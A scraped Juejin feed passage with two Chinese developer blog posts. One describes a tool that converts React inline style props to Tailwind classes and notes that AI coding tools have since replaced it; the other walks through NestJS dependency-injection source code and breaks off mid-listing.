itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            三年前写的一个代码工具，至今已被 AI Coding 完全取代。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3413334152193454/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    马致良
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:22:17.000Z" title="Mon Dec 29 2025 09:22:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<ul>
<li>仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmapinxue%2Fsun-dock" target="_blank" title="https://github.com/mapinxue/sun-dock" ref="nofollow noopener noreferrer">github.com/mapinxue/su…</a></li>
<li>演示：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmapinxue.github.io%2Fsun-dock%2Fapp%2Fdist%2F" target="_blank" title="https://mapinxue.github.io/sun-dock/app/dist/" ref="nofollow noopener noreferrer">mapinxue.github.io/sun-dock/ap…</a></li>
<li>功能：在 React 代码中将 Inline style props 变为 Inline tailwind css.</li>
</ul>
</blockquote>
<h2 data-id="heading-0">初衷</h2>
<p>2022 年在 momenta 实习的时候就经常发现一个代码问题，大家编写的代码中经常出现 style props 和 tailwind css 并存的现象，就像是：</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;div className=<span class="hljs-string">"inline-block"</span> style={{ <span class="hljs-attr">width</span>: <span class="hljs-number">300</span> }} /&gt;
</code></pre>
<p>这个简单的代码已经有了两个问题：</p>
<ol>
<li>代码风格不统一。已经引入了 tailwind css，又使用 style props 仅仅作为样式而不是变量</li>
<li>总是引发重新渲染。style props 使用的字面量 object <code>{ width: 300 }</code>, 会在每次父组件重新渲染的时候引发这个组件的重新渲染。如下面这个代码所示：</li>
</ol>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">CompA</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> {count} <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt; +1 <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> <span class="hljs-attr">300</span> }}&gt;</span>
                {/* 这里是个巨大的组件 */}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/&gt;</span></span>
    )
}
</code></pre>
<p>编写一个 demo，左边是直接使用 object 字面量编写的 react 组件，右边是经过 useMemo 固化的 object字面量，其在点击按钮加一引发重新渲染后，左侧会跟个重新渲染，而右侧则保持静态不重新渲染。运行效果如图所示</p>
<ul>
<li>demo: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmapinxue%2Freact-rerender-demo" target="_blank" title="https://github.com/mapinxue/react-rerender-demo" ref="nofollow noopener noreferrer">github.com/mapinxue/re…</a></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23ee112d823e42c7b9c6eb7e0e09abc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ams6Ie06Imv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767605348&amp;x-signature=KEfplpZ9aHSuIOeR4ZSvlFt3dfI%3D" alt="动画.gif" loading="lazy"/></p>
<p>这仅是一个演示 demo，当真正进入生产环境中，被牵连的组件可能规模比较庞大，重新渲染可能导致显示页面跳动、白屏，以及<strong>普遍的性能损失和性能优化失败</strong>。</p>
<h2 data-id="heading-1">解决办法</h2>
<p>这个问题解决办法的文字描述如下：</p>
<p>首先，行 AST 分析，得到每个组件的抽象语法树数据。<br/>
第二，遍历语法树，查询每个 Node 上是否有 style object。<br/>
第三，<strong>对 Style Object 中的 Properties 进行遍历并通过某些手段映射到 Tailwind CSS string 上。</strong><br/>
第四，重构 AST，删除 Style object, 增加 className。<br/>
最后，保存文件。</p>
<hr/>
<p>上述步骤中最复杂的是第三步，其需要考虑多种情况：</p>
<ul>
<li>静态映射</li>
<li>动态映射</li>
<li>状态传递</li>
</ul>
<p>对于静态映射，其变化为：</p>
<pre><code class="hljs language-tsx" lang="tsx">{ <span class="hljs-attr">textAlign</span>: <span class="hljs-string">"left"</span> }  -&gt; <span class="hljs-string">"text-left"</span>
</code></pre>
<p>对于动态映射，其变化为：</p>
<pre><code class="hljs language-tsx" lang="tsx">{ <span class="hljs-attr">marginLeft</span>: <span class="hljs-number">1</span> } or { <span class="hljs-attr">marginLeft</span>: <span class="hljs-string">'1px'</span> } -&gt; <span class="hljs-string">"ml-[1px]"</span>
</code></pre>
<p>对于状态传递，其应该保留，一般展现形式为变量或者插值：</p>
<pre><code class="hljs language-tsx" lang="tsx">{ <span class="hljs-attr">position</span>: <span class="hljs-string">'absolute'</span>, <span class="hljs-attr">top</span>: <span class="hljs-string">`<span class="hljs-subst">${topVar}</span>`</span> } -&gt; <span class="hljs-string">"absolute"</span> { <span class="hljs-attr">top</span>: <span class="hljs-string">`<span class="hljs-subst">${topVar}</span>`</span> }
</code></pre>
<hr/>
<p>所以在当时的测试样例中我是这样写的：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> testSamples = [
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ textAlign: 'center' }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="text-center"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ textAlign: false }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`textAlign: false`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ backgroudUnknow: 'black', textAlign: 'center'  }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="text-center"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: '2px' }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="p-[2px]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: 2 }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="p-[2px]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: '2px 4px 2px' }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="pt-[2px] py-[4px] pb-[2px]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ strokeWidth: 4 }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="stroke-width-4"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ strokeWidth: '4' }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="stroke-width-4"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ textAlign: 'center !important' }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="!text-center"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: '100%', margin: 'calc(100%)' }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="p-[100%] m-[calc(100%)]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ fontWeight: 500 }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="font-500"`</span>
    },
];
</code></pre>
<hr/>
<h2 data-id="heading-2">如今</h2>
<p>如今，三年后各种 AI coding 工具层出不穷，Claude Code, Gemini Cli, 以及国内的 Qwen Coder，都可以仅用一句提示词做到上述的所有工作：</p>
<pre><code class="hljs">帮我查看一下这个项目，并将所有组件中使用的 React Style Props 切换为 Tailwind css，并输出这样做的好处。
</code></pre>
<p>根据你的项目大小，也许 5-15 分钟后，全部的代码已经被改造完成了，并且 AI 的改动可能更具有逻辑性。</p>
<p>并且在你使用 AI 编写的代码中，很少会出现是使用 React Style Props 的情况了。</p>
<p>我的这个小项目也被正式的完全替代了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[依赖注入系统]]></title>    <link>https://juejin.cn/post/7589082912588251179</link>    <guid>https://juejin.cn/post/7589082912588251179</guid>    <pubDate>2025-12-29T09:34:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912588251179" data-draft-id="7589099845186175012" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="依赖注入系统"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-29T09:34:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="借个火er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            依赖注入系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    借个火er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:34:10.000Z" title="Mon Dec 29 2025 09:34:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">NestJS 源码解析：依赖注入系统</h2>
<blockquote>
<p>深入 Injector 和 Container，揭秘 NestJS 的 IoC 实现。</p>
</blockquote>
<h3 data-id="heading-1">依赖注入基础</h3>
<p>NestJS 的依赖注入基于 TypeScript 装饰器和 <code>reflect-metadata</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> logger: LoggerService</span>) {}
}
</code></pre>
<p>编译后，TypeScript 会生成元数据，记录构造函数参数类型。</p>
<h3 data-id="heading-2">核心组件</h3>
<h4 data-id="heading-3">1. InstanceWrapper</h4>
<p>包装每个可注入的实例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/instance-wrapper.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstanceWrapper</span>&lt;T = <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">token</span>: <span class="hljs-title class_">InjectionToken</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">metatype</span>: <span class="hljs-title class_">Type</span>&lt;T&gt;;
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> scope?: <span class="hljs-title class_">Scope</span>;

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> values = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>&lt;<span class="hljs-title class_">ContextId</span>, <span class="hljs-title class_">InstancePerContext</span>&lt;T&gt;&gt;();

  <span class="hljs-comment">// 获取实例</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">instance</span>(): T {
    <span class="hljs-keyword">const</span> instancePerContext = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getInstanceByContextId</span>(<span class="hljs-variable constant_">STATIC_CONTEXT</span>);
    <span class="hljs-keyword">return</span> instancePerContext.<span class="hljs-property">instance</span>;
  }

  <span class="hljs-comment">// 设置实例</span>
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">instance</span>(<span class="hljs-params">value: T</span>) {
    <span class="hljs-keyword">const</span> instancePerContext = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getInstanceByContextId</span>(<span class="hljs-variable constant_">STATIC_CONTEXT</span>);
    instancePerContext.<span class="hljs-property">instance</span> = value;
  }

  <span class="hljs-comment">// 获取构造函数元数据</span>
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getCtorMetadata</span>(): <span class="hljs-title class_">InstanceWrapper</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">inject</span> || [];
  }
}
</code></pre>
<h4 data-id="heading-4">2. Module</h4>
<p>模块类，管理 providers、controllers、imports、exports：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/module.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Module</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _providers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">InjectionToken</span>, <span class="hljs-title class_">InstanceWrapper</span>&lt;<span class="hljs-title class_">Injectable</span>&gt;&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _controllers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">InjectionToken</span>, <span class="hljs-title class_">InstanceWrapper</span>&lt;<span class="hljs-title class_">Controller</span>&gt;&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _imports = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Module</span>&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _exports = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">InjectionToken</span>&gt;();

  <span class="hljs-comment">// 添加 Provider</span>
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">addProvider</span>(<span class="hljs-attr">provider</span>: <span class="hljs-title class_">Provider</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomProvider</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomProvider</span>(provider);
    }

    <span class="hljs-keyword">const</span> token = provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">Type</span>&lt;<span class="hljs-title class_">Injectable</span>&gt;;
    <span class="hljs-keyword">const</span> wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstanceWrapper</span>({
      token,
      <span class="hljs-attr">name</span>: token.<span class="hljs-property">name</span>,
      <span class="hljs-attr">metatype</span>: token,
      <span class="hljs-attr">instance</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">isResolved</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">scope</span>: <span class="hljs-title function_">getClassScope</span>(token),
      <span class="hljs-attr">host</span>: <span class="hljs-variable language_">this</span>,
    });

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_providers</span>.<span class="hljs-title function_">set</span>(token, wrapper);
    <span class="hljs-keyword">return</span> token.<span class="hljs-property">name</span>;
  }

  <span class="hljs-comment">// 添加自定义 Provider</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">addCustomProvider</span>(<span class="hljs-attr">provider</span>: <span class="hljs-title class_">Provider</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomClass</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomClass</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">ClassProvider</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomValue</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomValue</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">ValueProvider</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomFactory</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomFactory</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">FactoryProvider</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomUseExisting</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomUseExisting</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">ExistingProvider</span>);
    }
  }
}
</code></pre>
<h4 data-id="heading-5">3. Injector</h4>
<p>依赖注入核心引擎：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Injector</span> {
  <span class="hljs-comment">// 加载实例</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> loadInstance&lt;T&gt;(
    <span class="hljs-attr">wrapper</span>: <span class="hljs-title class_">InstanceWrapper</span>&lt;T&gt;,
    <span class="hljs-attr">collection</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">InjectionToken</span>, <span class="hljs-title class_">InstanceWrapper</span>&gt;,
    <span class="hljs-attr">moduleRef</span>: <span class="hljs-title class_">Module</span>,
